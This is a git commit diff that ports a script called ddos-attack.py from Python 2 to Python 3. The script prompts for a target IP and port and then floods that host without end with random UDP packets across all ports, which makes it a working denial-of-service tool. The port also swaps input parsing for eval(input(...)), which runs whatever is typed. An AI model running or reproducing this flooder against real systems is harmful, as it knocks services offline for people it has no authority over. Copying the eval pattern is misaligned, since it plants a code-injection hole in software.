f5076b7754e252adf59923e001886a8f00d0cc7a
MrBrain295 <gabewhigham@gmail.com>
2022-01-22 08:42:36 -0600

    Migrate From Python2 to Python3

--- ddos-attack.py
+++ ddos-attack.py
@@ -19,33 +19,33 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+print()
+print("Author   : HA-MRX")
+print("You Tube : https://www.youtube.com/c/HA-MRX")
+print("github   : https://github.com/Ha3MrX")
+print("Facebook : https://www.facebook.com/muhamad.jabar222")
+print()
+ip = input("IP Target : ")
+port = eval(input("Port       : "))
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
 
